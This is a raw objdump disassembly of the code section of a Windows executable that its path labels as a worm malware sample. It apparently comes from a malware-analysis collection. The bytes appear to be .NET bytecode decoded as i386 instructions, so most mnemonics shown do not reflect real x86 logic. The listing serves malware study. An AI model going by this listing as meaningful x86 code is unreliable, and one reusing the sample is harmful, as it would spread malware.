
malware_samples/worm/cd59ef9b32190f8326ad4bd0d01f078cc2b958a17e51ce51e76129caf672fa6d.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402001:	87 00                	xchg   %eax,(%eax)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 2c 46 00       	add    $0x462c00,%eax
  402013:	00 ac 40 00 00 03 00 	add    %ch,0x30000(%eax,%eax,2)
  40201a:	02 00                	add    (%eax),%al
  40201c:	1c 00                	sbb    $0x0,%al
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	be 28 02 00 00       	mov    $0x228,%esi
  402055:	06                   	push   %es
  402056:	2c 02                	sub    $0x2,%al
  402058:	17                   	pop    %ss
  402059:	2a 28                	sub    (%eax),%ch
  40205b:	03 00                	add    (%eax),%eax
  40205d:	00 06                	add    %al,(%esi)
  40205f:	2c 02                	sub    $0x2,%al
  402061:	17                   	pop    %ss
  402062:	2a 28                	sub    (%eax),%ch
  402064:	04 00                	add    $0x0,%al
  402066:	00 06                	add    %al,(%esi)
  402068:	2c 02                	sub    $0x2,%al
  40206a:	17                   	pop    %ss
  40206b:	2a 28                	sub    (%eax),%ch
  40206d:	05 00 00 06 2c       	add    $0x2c060000,%eax
  402072:	02 17                	add    (%edi),%dl
  402074:	2a 28                	sub    (%eax),%ch
  402076:	06                   	push   %es
  402077:	00 00                	add    %al,(%eax)
  402079:	06                   	push   %es
  40207a:	2c 02                	sub    $0x2,%al
  40207c:	17                   	pop    %ss
  40207d:	2a 16                	sub    (%esi),%dl
  40207f:	2a 3e                	sub    (%esi),%bh
  402081:	28 17                	sub    %dl,(%edi)
  402083:	00 00                	add    %al,(%eax)
  402085:	0a 2d 06 28 18 00    	or     0x182806,%ch
  40208b:	00 0a                	add    %cl,(%edx)
  40208d:	2a 17                	sub    (%edi),%dl
  40208f:	2a 1b                	sub    (%ebx),%bl
  402091:	30 03                	xor    %al,(%ebx)
  402093:	00 df                	add    %bl,%bh
  402095:	00 00                	add    %al,(%eax)
  402097:	00 01                	add    %al,(%ecx)
  402099:	00 00                	add    %al,(%eax)
  40209b:	11 72 01             	adc    %esi,0x1(%edx)
  40209e:	00 00                	add    %al,(%eax)
  4020a0:	70 73                	jo     0x402115
  4020a2:	19 00                	sbb    %eax,(%eax)
  4020a4:	00 0a                	add    %cl,(%edx)
  4020a6:	0a 06                	or     (%esi),%al
  4020a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4020a9:	1a 00                	sbb    (%eax),%al
  4020ab:	00 0a                	add    %cl,(%edx)
  4020ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4020ae:	1b 00                	sbb    (%eax),%eax
  4020b0:	00 0a                	add    %cl,(%edx)
  4020b2:	0b 38                	or     (%eax),%edi
  4020b4:	96                   	xchg   %eax,%esi
  4020b5:	00 00                	add    %al,(%eax)
  4020b7:	00 07                	add    %al,(%edi)
  4020b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4020ba:	1c 00                	sbb    $0x0,%al
  4020bc:	00 0a                	add    %cl,(%edx)
  4020be:	25 72 47 00 00       	and    $0x4772,%eax
  4020c3:	70 6f                	jo     0x402134
  4020c5:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  4020ca:	2d 06 26 72 61       	sub    $0x61722606,%eax
  4020cf:	00 00                	add    %al,(%eax)
  4020d1:	70 6f                	jo     0x402142
  4020d3:	1e                   	push   %ds
  4020d4:	00 00                	add    %al,(%eax)
  4020d6:	0a 6f 1f             	or     0x1f(%edi),%ch
  4020d9:	00 00                	add    %al,(%eax)
  4020db:	0a 0c 72             	or     (%edx,%esi,2),%cl
  4020de:	63 00                	arpl   %eax,(%eax)
  4020e0:	00 70 6f             	add    %dh,0x6f(%eax)
  4020e3:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  4020e8:	2d 06 26 72 61       	sub    $0x61722606,%eax
  4020ed:	00 00                	add    %al,(%eax)
  4020ef:	70 6f                	jo     0x402160
  4020f1:	1e                   	push   %ds
  4020f2:	00 00                	add    %al,(%eax)
  4020f4:	0a 6f 1f             	or     0x1f(%edi),%ch
  4020f7:	00 00                	add    %al,(%eax)
  4020f9:	0a 0d 08 72 6f 00    	or     0x6f7208,%cl
  4020ff:	00 70 6f             	add    %dh,0x6f(%eax)
  402102:	20 00                	and    %al,(%eax)
  402104:	00 0a                	add    %cl,(%edx)
  402106:	2c 0d                	sub    $0xd,%al
  402108:	09 72 9b             	or     %esi,-0x65(%edx)
  40210b:	00 00                	add    %al,(%eax)
  40210d:	70 6f                	jo     0x40217e
  40210f:	20 00                	and    %al,(%eax)
  402111:	00 0a                	add    %cl,(%edx)
  402113:	2d 34 08 72 ab       	sub    $0xab720834,%eax
  402118:	00 00                	add    %al,(%eax)
  40211a:	70 6f                	jo     0x40218b
  40211c:	20 00                	and    %al,(%eax)
  40211e:	00 0a                	add    %cl,(%edx)
  402120:	2d 27 09 72 b9       	sub    $0xb9720927,%eax
  402125:	00 00                	add    %al,(%eax)
  402127:	70 6f                	jo     0x402198
  402129:	20 00                	and    %al,(%eax)
  40212b:	00 0a                	add    %cl,(%edx)
  40212d:	2d 1a 08 72 cf       	sub    $0xcf72081a,%eax
  402132:	00 00                	add    %al,(%eax)
  402134:	70 6f                	jo     0x4021a5
  402136:	20 00                	and    %al,(%eax)
  402138:	00 0a                	add    %cl,(%edx)
  40213a:	2d 0d 08 72 d9       	sub    $0xd972080d,%eax
  40213f:	00 00                	add    %al,(%eax)
  402141:	70 6f                	jo     0x4021b2
  402143:	20 00                	and    %al,(%eax)
  402145:	00 0a                	add    %cl,(%edx)
  402147:	2c 05                	sub    $0x5,%al
  402149:	17                   	pop    %ss
  40214a:	13 04 de             	adc    (%esi,%ebx,8),%eax
  40214d:	2a 07                	sub    (%edi),%al
  40214f:	6f                   	outsl  %ds:(%esi),(%dx)
  402150:	21 00                	and    %eax,(%eax)
  402152:	00 0a                	add    %cl,(%edx)
  402154:	3a 5f ff             	cmp    -0x1(%edi),%bl
  402157:	ff                   	(bad)
  402158:	ff                   	lcall  (bad)
  402159:	de 0a                	fimuls (%edx)
  40215b:	07                   	pop    %es
  40215c:	2c 06                	sub    $0x6,%al
  40215e:	07                   	pop    %es
  40215f:	6f                   	outsl  %ds:(%esi),(%dx)
  402160:	22 00                	and    (%eax),%al
  402162:	00 0a                	add    %cl,(%edx)
  402164:	dc de                	(bad)
  402166:	0a 06                	or     (%esi),%al
  402168:	2c 06                	sub    $0x6,%al
  40216a:	06                   	push   %es
  40216b:	6f                   	outsl  %ds:(%esi),(%dx)
  40216c:	22 00                	and    (%eax),%al
  40216e:	00 0a                	add    %cl,(%edx)
  402170:	dc de                	(bad)
  402172:	03 26                	add    (%esi),%esp
  402174:	de 00                	fiadds (%eax)
  402176:	16                   	push   %ss
  402177:	2a 11                	sub    (%ecx),%dl
  402179:	04 2a                	add    $0x2a,%al
  40217b:	00 01                	add    %al,(%ecx)
  40217d:	28 00                	sub    %al,(%eax)
  40217f:	00 02                	add    %al,(%edx)
  402181:	00 17                	add    %dl,(%edi)
  402183:	00 a8 bf 00 0a 00    	add    %ch,0xa00bf(%eax)
  402189:	00 00                	add    %al,(%eax)
  40218b:	00 02                	add    %al,(%edx)
  40218d:	00 0b                	add    %cl,(%ebx)
  40218f:	00 c0                	add    %al,%al
  402191:	cb                   	lret
  402192:	00 0a                	add    %cl,(%edx)
	...
  40219c:	d7                   	xlat   %ds:(%ebx)
  40219d:	d7                   	xlat   %ds:(%ebx)
  40219e:	00 03                	add    %al,(%ebx)
  4021a0:	13 00                	adc    (%eax),%eax
  4021a2:	00 01                	add    %al,(%ecx)
  4021a4:	1b 30                	sbb    (%eax),%esi
  4021a6:	03 00                	add    (%eax),%eax
  4021a8:	56                   	push   %esi
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	00 02                	add    %al,(%edx)
  4021ad:	00 00                	add    %al,(%eax)
  4021af:	11 28                	adc    %ebp,(%eax)
  4021b1:	23 00                	and    (%eax),%eax
  4021b3:	00 0a                	add    %cl,(%edx)
  4021b5:	0a 16                	or     (%esi),%dl
  4021b7:	0b 2b                	or     (%ebx),%ebp
  4021b9:	3c 06                	cmp    $0x6,%al
  4021bb:	07                   	pop    %es
  4021bc:	9a 0c 73 2e 00 00 06 	lcall  $0x600,$0x2e730c
  4021c3:	0d 09 08 6f 24       	or     $0x246f0809,%eax
  4021c8:	00 00                	add    %al,(%eax)
  4021ca:	0a 6f 1f             	or     0x1f(%edi),%ch
  4021cd:	00 00                	add    %al,(%eax)
  4021cf:	0a 7d 13             	or     0x13(%ebp),%bh
  4021d2:	00 00                	add    %al,(%eax)
  4021d4:	04 7e                	add    $0x7e,%al
  4021d6:	01 00                	add    %eax,(%eax)
  4021d8:	00 04 09             	add    %al,(%ecx,%ecx,1)
  4021db:	fe 06                	incb   (%esi)
  4021dd:	2f                   	das
  4021de:	00 00                	add    %al,(%eax)
  4021e0:	06                   	push   %es
  4021e1:	73 25                	jae    0x402208
  4021e3:	00 00                	add    %al,(%eax)
  4021e5:	0a 28                	or     (%eax),%ch
  4021e7:	01 00                	add    %eax,(%eax)
  4021e9:	00 2b                	add    %ch,(%ebx)
  4021eb:	2c 05                	sub    $0x5,%al
  4021ed:	17                   	pop    %ss
  4021ee:	13 04 de             	adc    (%esi,%ebx,8),%eax
  4021f1:	11 07                	adc    %eax,(%edi)
  4021f3:	17                   	pop    %ss
  4021f4:	58                   	pop    %eax
  4021f5:	0b 07                	or     (%edi),%eax
  4021f7:	06                   	push   %es
  4021f8:	8e 69 32             	mov    0x32(%ecx),%gs
  4021fb:	be de 03 26 de       	mov    $0xde2603de,%esi
  402200:	00 16                	add    %dl,(%esi)
  402202:	2a 11                	sub    (%ecx),%dl
  402204:	04 2a                	add    $0x2a,%al
  402206:	00 00                	add    %al,(%eax)
  402208:	01 10                	add    %edx,(%eax)
  40220a:	00 00                	add    %al,(%eax)
  40220c:	00 00                	add    %al,(%eax)
  40220e:	00 00                	add    %al,(%eax)
  402210:	4e                   	dec    %esi
  402211:	4e                   	dec    %esi
  402212:	00 03                	add    %al,(%ebx)
  402214:	13 00                	adc    (%eax),%eax
  402216:	00 01                	add    %al,(%ecx)
  402218:	1b 30                	sbb    (%eax),%esi
  40221a:	02 00                	add    (%eax),%al
  40221c:	43                   	inc    %ebx
  40221d:	00 00                	add    %al,(%eax)
  40221f:	00 03                	add    %al,(%ebx)
  402221:	00 00                	add    %al,(%eax)
  402223:	11 7e 27             	adc    %edi,0x27(%esi)
  402226:	00 00                	add    %al,(%eax)
  402228:	0a 72 e1             	or     -0x1f(%edx),%dh
  40222b:	00 00                	add    %al,(%eax)
  40222d:	70 6f                	jo     0x40229e
  40222f:	28 00                	sub    %al,(%eax)
  402231:	00 0a                	add    %cl,(%edx)
  402233:	0a 06                	or     (%esi),%al
  402235:	2c 1b                	sub    $0x1b,%al
  402237:	06                   	push   %es
  402238:	72 6a                	jb     0x4022a4
  40223a:	01 00                	add    %eax,(%eax)
  40223c:	70 6f                	jo     0x4022ad
  40223e:	29 00                	sub    %eax,(%eax)
  402240:	00 0a                	add    %cl,(%edx)
  402242:	0b 07                	or     (%edi),%eax
  402244:	2c 0c                	sub    $0xc,%al
  402246:	07                   	pop    %es
  402247:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402248:	49                   	dec    %ecx
  402249:	00 00                	add    %al,(%eax)
  40224b:	01 2c 04             	add    %ebp,(%esp,%eax,1)
  40224e:	17                   	pop    %ss
  40224f:	0c de                	or     $0xde,%al
  402251:	13 de                	adc    %esi,%ebx
  402253:	0a 06                	or     (%esi),%al
  402255:	2c 06                	sub    $0x6,%al
  402257:	06                   	push   %es
  402258:	6f                   	outsl  %ds:(%esi),(%dx)
  402259:	22 00                	and    (%eax),%al
  40225b:	00 0a                	add    %cl,(%edx)
  40225d:	dc de                	(bad)
  40225f:	03 26                	add    (%esi),%esp
  402261:	de 00                	fiadds (%eax)
  402263:	16                   	push   %ss
  402264:	2a 08                	sub    (%eax),%cl
  402266:	2a 00                	sub    (%eax),%al
  402268:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40226b:	00 02                	add    %al,(%edx)
  40226d:	00 10                	add    %dl,(%eax)
  40226f:	00 20                	add    %ah,(%eax)
  402271:	30 00                	xor    %al,(%eax)
  402273:	0a 00                	or     (%eax),%al
  402275:	00 00                	add    %al,(%eax)
  402277:	00 00                	add    %al,(%eax)
  402279:	00 00                	add    %al,(%eax)
  40227b:	00 3c 3c             	add    %bh,(%esp,%edi,1)
  40227e:	00 03                	add    %al,(%ebx)
  402280:	13 00                	adc    (%eax),%eax
  402282:	00 01                	add    %al,(%ecx)
  402284:	1b 30                	sbb    (%eax),%esi
  402286:	02 00                	add    (%eax),%al
  402288:	2c 00                	sub    $0x0,%al
  40228a:	00 00                	add    %al,(%eax)
  40228c:	04 00                	add    $0x0,%al
  40228e:	00 11                	add    %dl,(%ecx)
  402290:	28 2a                	sub    %ch,(%edx)
  402292:	00 00                	add    %al,(%eax)
  402294:	0a 1f                	or     (%edi),%bl
  402296:	64 28 2b             	sub    %ch,%fs:(%ebx)
  402299:	00 00                	add    %al,(%eax)
  40229b:	0a 25 6f 2c 00 00    	or     0x2c6f,%ah
  4022a1:	0a 6f 2d             	or     0x2d(%edi),%ch
  4022a4:	00 00                	add    %al,(%eax)
  4022a6:	0a 20                	or     (%eax),%ah
  4022a8:	96                   	xchg   %eax,%esi
  4022a9:	00 00                	add    %al,(%eax)
  4022ab:	00 6a 31             	add    %ch,0x31(%edx)
  4022ae:	04 17                	add    $0x17,%al
  4022b0:	0a de                	or     %dh,%bl
  4022b2:	07                   	pop    %es
  4022b3:	de 03                	fiadds (%ebx)
  4022b5:	26 de 00             	fiadds %es:(%eax)
  4022b8:	16                   	push   %ss
  4022b9:	2a 06                	sub    (%esi),%al
  4022bb:	2a 01                	sub    (%ecx),%al
  4022bd:	10 00                	adc    %al,(%eax)
  4022bf:	00 00                	add    %al,(%eax)
  4022c1:	00 00                	add    %al,(%eax)
  4022c3:	00 25 25 00 03 13    	add    %ah,0x13030025
  4022c9:	00 00                	add    %al,(%eax)
  4022cb:	01 13                	add    %edx,(%ebx)
  4022cd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4022d0:	8b 00                	mov    (%eax),%eax
  4022d2:	00 00                	add    %al,(%eax)
  4022d4:	00 00                	add    %al,(%eax)
  4022d6:	00 00                	add    %al,(%eax)
  4022d8:	1f                   	pop    %ds
  4022d9:	0f 8d 43 00 00 01    	jge    0x1402322
  4022df:	25 16 72 7a 01       	and    $0x17a7216,%eax
  4022e4:	00 70 a2             	add    %dh,-0x5e(%eax)
  4022e7:	25 17 72 8a 01       	and    $0x18a7217,%eax
  4022ec:	00 70 a2             	add    %dh,-0x5e(%eax)
  4022ef:	25 18 72 96 01       	and    $0x1967218,%eax
  4022f4:	00 70 a2             	add    %dh,-0x5e(%eax)
  4022f7:	25 19 72 9e 01       	and    $0x19e7219,%eax
  4022fc:	00 70 a2             	add    %dh,-0x5e(%eax)
  4022ff:	25 1a 72 a8 01       	and    $0x1a8721a,%eax
  402304:	00 70 a2             	add    %dh,-0x5e(%eax)
  402307:	25 1b 72 b2 01       	and    $0x1b2721b,%eax
  40230c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40230f:	25 1c 72 c0 01       	and    $0x1c0721c,%eax
  402314:	00 70 a2             	add    %dh,-0x5e(%eax)
  402317:	25 1d 72 ca 01       	and    $0x1ca721d,%eax
  40231c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40231f:	25 1e 72 d8 01       	and    $0x1d8721e,%eax
  402324:	00 70 a2             	add    %dh,-0x5e(%eax)
  402327:	25 1f 09 72 ec       	and    $0xec72091f,%eax
  40232c:	01 00                	add    %eax,(%eax)
  40232e:	70 a2                	jo     0x4022d2
  402330:	25 1f 0a 72 fc       	and    $0xfc720a1f,%eax
  402335:	01 00                	add    %eax,(%eax)
  402337:	70 a2                	jo     0x4022db
  402339:	25 1f 0b 72 0a       	and    $0xa720b1f,%eax
  40233e:	02 00                	add    (%eax),%al
  402340:	70 a2                	jo     0x4022e4
  402342:	25 1f 0c 72 18       	and    $0x18720c1f,%eax
  402347:	02 00                	add    (%eax),%al
  402349:	70 a2                	jo     0x4022ed
  40234b:	25 1f 0d 72 2a       	and    $0x2a720d1f,%eax
  402350:	02 00                	add    (%eax),%al
  402352:	70 a2                	jo     0x4022f6
  402354:	25 1f 0e 72 3a       	and    $0x3a720e1f,%eax
  402359:	02 00                	add    (%eax),%al
  40235b:	70 a2                	jo     0x4022ff
  40235d:	80 01 00             	addb   $0x0,(%ecx)
  402360:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402363:	00 1b                	add    %bl,(%ebx)
  402365:	30 02                	xor    %al,(%edx)
  402367:	00 55 00             	add    %dl,0x0(%ebp)
  40236a:	00 00                	add    %al,(%eax)
  40236c:	05 00 00 11 28       	add    $0x28110000,%eax
  402371:	09 00                	or     %eax,(%eax)
  402373:	00 06                	add    %al,(%esi)
  402375:	0a 06                	or     (%esi),%al
  402377:	2d 02 de 49 28       	sub    $0x2849de02,%eax
  40237c:	2e 00 00             	add    %al,%cs:(%eax)
  40237f:	0a 6f 2f             	or     0x2f(%edi),%ch
  402382:	00 00                	add    %al,(%eax)
  402384:	0a 6f 30             	or     0x30(%edi),%ch
  402387:	00 00                	add    %al,(%eax)
  402389:	0a 0b                	or     (%ebx),%cl
  40238b:	7e 02                	jle    0x40238f
  40238d:	00 00                	add    %al,(%eax)
  40238f:	04 0c                	add    $0xc,%al
  402391:	16                   	push   %ss
  402392:	0d 2b 24 08 09       	or     $0x908242b,%eax
  402397:	9a 13 04 06 11 04 28 	lcall  $0x2804,$0x11060413
  40239e:	31 00                	xor    %eax,(%eax)
  4023a0:	00 0a                	add    %cl,(%edx)
  4023a2:	13 05 11 05 28 32    	adc    0x32280511,%eax
  4023a8:	00 00                	add    %al,(%eax)
  4023aa:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  4023ad:	11 05 07 28 0a 00    	adc    %eax,0xa2807
  4023b3:	00 06                	add    %al,(%esi)
  4023b5:	09 17                	or     %edx,(%edi)
  4023b7:	58                   	pop    %eax
  4023b8:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4023bd:	32 d6                	xor    %dh,%dl
  4023bf:	de 03                	fiadds (%ebx)
  4023c1:	26 de 00             	fiadds %es:(%eax)
  4023c4:	2a 00                	sub    (%eax),%al
  4023c6:	00 00                	add    %al,(%eax)
  4023c8:	01 10                	add    %edx,(%eax)
  4023ca:	00 00                	add    %al,(%eax)
  4023cc:	00 00                	add    %al,(%eax)
  4023ce:	00 00                	add    %al,(%eax)
  4023d0:	51                   	push   %ecx
  4023d1:	51                   	push   %ecx
  4023d2:	00 03                	add    %al,(%ebx)
  4023d4:	13 00                	adc    (%eax),%eax
  4023d6:	00 01                	add    %al,(%ecx)
  4023d8:	13 30                	adc    (%eax),%esi
  4023da:	02 00                	add    (%eax),%al
  4023dc:	1e                   	push   %ds
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	00 06                	add    %al,(%esi)
  4023e1:	00 00                	add    %al,(%eax)
  4023e3:	11 1f                	adc    %ebx,(%edi)
  4023e5:	1c 28                	sbb    $0x28,%al
  4023e7:	33 00                	xor    (%eax),%eax
  4023e9:	00 0a                	add    %cl,(%edx)
  4023eb:	72 56                	jb     0x402443
  4023ed:	02 00                	add    (%eax),%al
  4023ef:	70 28                	jo     0x402419
  4023f1:	31 00                	xor    %eax,(%eax)
  4023f3:	00 0a                	add    %cl,(%edx)
  4023f5:	0a 06                	or     (%esi),%al
  4023f7:	28 32                	sub    %dh,(%edx)
  4023f9:	00 00                	add    %al,(%eax)
  4023fb:	0a 2c 02             	or     (%edx,%eax,1),%ch
  4023fe:	06                   	push   %es
  4023ff:	2a 14 2a             	sub    (%edx,%ebp,1),%dl
  402402:	00 00                	add    %al,(%eax)
  402404:	1b 30                	sbb    (%eax),%esi
  402406:	04 00                	add    $0x0,%al
  402408:	ba 00 00 00 07       	mov    $0x7000000,%edx
  40240d:	00 00                	add    %al,(%eax)
  40240f:	11 02                	adc    %eax,(%edx)
  402411:	72 66                	jb     0x402479
  402413:	02 00                	add    (%eax),%al
  402415:	70 28                	jo     0x40243f
  402417:	31 00                	xor    %eax,(%eax)
  402419:	00 0a                	add    %cl,(%edx)
  40241b:	0a 06                	or     (%esi),%al
  40241d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  402420:	00 0a                	add    %cl,(%edx)
  402422:	2c 05                	sub    $0x5,%al
  402424:	dd a0 00 00 00 1d    	frstor 0x1d000000(%eax)
  40242a:	8d 43 00             	lea    0x0(%ebx),%eax
  40242d:	00 01                	add    %al,(%ecx)
  40242f:	25 16 72 8c 02       	and    $0x28c7216,%eax
  402434:	00 70 a2             	add    %dh,-0x5e(%eax)
  402437:	25 17 06 a2 25       	and    $0x25a20617,%eax
  40243c:	18 72 35             	sbb    %dh,0x35(%edx)
  40243f:	03 00                	add    (%eax),%eax
  402441:	70 a2                	jo     0x4023e5
  402443:	25 19 03 a2 25       	and    $0x25a20319,%eax
  402448:	1a 72 67             	sbb    0x67(%edx),%dh
  40244b:	03 00                	add    (%eax),%eax
  40244d:	70 a2                	jo     0x4023f1
  40244f:	25 1b 03 28 35       	and    $0x3528031b,%eax
  402454:	00 00                	add    %al,(%eax)
  402456:	0a a2 25 1c 72 a3    	or     -0x5c8de3db(%edx),%ah
  40245c:	03 00                	add    (%eax),%eax
  40245e:	70 a2                	jo     0x402402
  402460:	28 36                	sub    %dh,(%esi)
  402462:	00 00                	add    %al,(%eax)
  402464:	0a 0b                	or     (%ebx),%cl
  402466:	28 37                	sub    %dh,(%edi)
  402468:	00 00                	add    %al,(%eax)
  40246a:	0a 72 3e             	or     0x3e(%edx),%dh
  40246d:	04 00                	add    $0x0,%al
  40246f:	70 28                	jo     0x402499
  402471:	38 00                	cmp    %al,(%eax)
  402473:	00 0a                	add    %cl,(%edx)
  402475:	0d 12 03 72 4a       	or     $0x4a720312,%eax
  40247a:	04 00                	add    $0x0,%al
  40247c:	70 28                	jo     0x4024a6
  40247e:	39 00                	cmp    %eax,(%eax)
  402480:	00 0a                	add    %cl,(%edx)
  402482:	72 4e                	jb     0x4024d2
  402484:	04 00                	add    $0x0,%al
  402486:	70 28                	jo     0x4024b0
  402488:	3a 00                	cmp    (%eax),%al
  40248a:	00 0a                	add    %cl,(%edx)
  40248c:	28 31                	sub    %dh,(%ecx)
  40248e:	00 00                	add    %al,(%eax)
  402490:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402493:	07                   	pop    %es
  402494:	28 3b                	sub    %bh,(%ebx)
  402496:	00 00                	add    %al,(%eax)
  402498:	0a 72 58             	or     0x58(%edx),%dh
  40249b:	04 00                	add    $0x0,%al
  40249d:	70 72                	jo     0x402511
  40249f:	68 04 00 70 08       	push   $0x8700004
  4024a4:	72 68                	jb     0x40250e
  4024a6:	04 00                	add    $0x0,%al
  4024a8:	70 28                	jo     0x4024d2
  4024aa:	3a 00                	cmp    (%eax),%al
  4024ac:	00 0a                	add    %cl,(%edx)
  4024ae:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4024b1:	00 0a                	add    %cl,(%edx)
  4024b3:	26 20 2c 01          	and    %ch,%es:(%ecx,%eax,1)
  4024b7:	00 00                	add    %al,(%eax)
  4024b9:	28 2b                	sub    %ch,(%ebx)
  4024bb:	00 00                	add    %al,(%eax)
  4024bd:	0a 08                	or     (%eax),%cl
  4024bf:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  4024c5:	03 26                	add    (%esi),%esp
  4024c7:	de 00                	fiadds (%eax)
  4024c9:	2a 00                	sub    (%eax),%al
  4024cb:	00 01                	add    %al,(%ecx)
  4024cd:	10 00                	adc    %al,(%eax)
  4024cf:	00 00                	add    %al,(%eax)
  4024d1:	00 00                	add    %al,(%eax)
  4024d3:	00 b6 b6 00 03 13    	add    %dh,0x130300b6(%esi)
  4024d9:	00 00                	add    %al,(%eax)
  4024db:	01 b2 1a 8d 43 00    	add    %esi,0x438d1a(%edx)
  4024e1:	00 01                	add    %al,(%ecx)
  4024e3:	25 16 72 6c 04       	and    $0x46c7216,%eax
  4024e8:	00 70 a2             	add    %dh,-0x5e(%eax)
  4024eb:	25 17 72 78 04       	and    $0x4787217,%eax
  4024f0:	00 70 a2             	add    %dh,-0x5e(%eax)
  4024f3:	25 18 72 94 04       	and    $0x4947218,%eax
  4024f8:	00 70 a2             	add    %dh,-0x5e(%eax)
  4024fb:	25 19 72 a8 04       	and    $0x4a87219,%eax
  402500:	00 70 a2             	add    %dh,-0x5e(%eax)
  402503:	80 02 00             	addb   $0x0,(%edx)
  402506:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402509:	00 00                	add    %al,(%eax)
  40250b:	00 13                	add    %dl,(%ebx)
  40250d:	30 02                	xor    %al,(%edx)
  40250f:	00 2f                	add    %ch,(%edi)
  402511:	00 00                	add    %al,(%eax)
  402513:	00 08                	add    %cl,(%eax)
  402515:	00 00                	add    %al,(%eax)
  402517:	11 12                	adc    %edx,(%edx)
  402519:	00 28                	add    %ch,(%eax)
  40251b:	3e 00 00             	add    %al,%ds:(%eax)
  40251e:	0a 7d 25             	or     0x25(%ebp),%bh
  402521:	00 00                	add    %al,(%eax)
  402523:	04 12                	add    $0x12,%al
  402525:	00 15 7d 24 00 00    	add    %dl,0x247d
  40252b:	04 12                	add    $0x12,%al
  40252d:	00 7c 25 00          	add    %bh,0x0(%ebp,%eiz,1)
  402531:	00 04 12             	add    %al,(%edx,%edx,1)
  402534:	00 28                	add    %ch,(%eax)
  402536:	02 00                	add    (%eax),%al
  402538:	00 2b                	add    %ch,(%ebx)
  40253a:	12 00                	adc    (%eax),%al
  40253c:	7c 25                	jl     0x402563
  40253e:	00 00                	add    %al,(%eax)
  402540:	04 28                	add    $0x28,%al
  402542:	40                   	inc    %eax
  402543:	00 00                	add    %al,(%eax)
  402545:	0a 2a                	or     (%edx),%ch
  402547:	00 1b                	add    %bl,(%ebx)
  402549:	30 03                	xor    %al,(%ebx)
  40254b:	00 f9                	add    %bh,%cl
  40254d:	00 00                	add    %al,(%eax)
  40254f:	00 09                	add    %cl,(%ecx)
  402551:	00 00                	add    %al,(%eax)
  402553:	11 14 0a             	adc    %edx,(%edx,%ecx,1)
  402556:	7e 41                	jle    0x402599
  402558:	00 00                	add    %al,(%eax)
  40255a:	0a 20                	or     (%eax),%ah
  40255c:	b3 15                	mov    $0x15,%bl
  40255e:	00 00                	add    %al,(%eax)
  402560:	73 42                	jae    0x4025a4
  402562:	00 00                	add    %al,(%eax)
  402564:	0a 0a                	or     (%edx),%cl
  402566:	06                   	push   %es
  402567:	6f                   	outsl  %ds:(%esi),(%dx)
  402568:	43                   	inc    %ebx
  402569:	00 00                	add    %al,(%eax)
  40256b:	0a 72 c4             	or     -0x3c(%edx),%dh
  40256e:	04 00                	add    $0x0,%al
  402570:	70 20                	jo     0x402592
  402572:	b3 15                	mov    $0x15,%bl
  402574:	00 00                	add    %al,(%eax)
  402576:	0b 12                	or     (%edx),%edx
  402578:	01 28                	add    %ebp,(%eax)
  40257a:	44                   	inc    %esp
  40257b:	00 00                	add    %al,(%eax)
  40257d:	0a 72 04             	or     0x4(%edx),%dh
  402580:	05 00 70 28 3a       	add    $0x3a287000,%eax
  402585:	00 00                	add    %al,(%eax)
  402587:	0a 28                	or     (%eax),%ch
  402589:	45                   	inc    %ebp
  40258a:	00 00                	add    %al,(%eax)
  40258c:	0a 06                	or     (%esi),%al
  40258e:	6f                   	outsl  %ds:(%esi),(%dx)
  40258f:	46                   	inc    %esi
  402590:	00 00                	add    %al,(%eax)
  402592:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402595:	6f                   	outsl  %ds:(%esi),(%dx)
  402596:	47                   	inc    %edi
  402597:	00 00                	add    %al,(%eax)
  402599:	0a 0d 09 28 48 00    	or     0x482809,%cl
  40259f:	00 0a                	add    %cl,(%edx)
  4025a1:	73 49                	jae    0x4025ec
  4025a3:	00 00                	add    %al,(%eax)
  4025a5:	0a 13                	or     (%ebx),%dl
  4025a7:	04 09                	add    $0x9,%al
  4025a9:	28 48 00             	sub    %cl,0x0(%eax)
  4025ac:	00 0a                	add    %cl,(%edx)
  4025ae:	73 4a                	jae    0x4025fa
  4025b0:	00 00                	add    %al,(%eax)
  4025b2:	0a 25 17 6f 4b 00    	or     0x4b6f17,%ah
  4025b8:	00 0a                	add    %cl,(%edx)
  4025ba:	13 05 11 04 6f 4c    	adc    0x4c6f0411,%eax
  4025c0:	00 00                	add    %al,(%eax)
  4025c2:	0a 13                	or     (%ebx),%dl
  4025c4:	06                   	push   %es
  4025c5:	72 0c                	jb     0x4025d3
  4025c7:	05 00 70 11 06       	add    $0x6117000,%eax
  4025cc:	28 4d 00             	sub    %cl,0x0(%ebp)
  4025cf:	00 0a                	add    %cl,(%edx)
  4025d1:	28 45 00             	sub    %al,0x0(%ebp)
  4025d4:	00 0a                	add    %cl,(%edx)
  4025d6:	11 06                	adc    %eax,(%esi)
  4025d8:	28 4e 00             	sub    %cl,0x0(%esi)
  4025db:	00 0a                	add    %cl,(%edx)
  4025dd:	2d 12 11 06 28       	sub    $0x28061112,%eax
  4025e2:	0e                   	push   %cs
  4025e3:	00 00                	add    %al,(%eax)
  4025e5:	06                   	push   %es
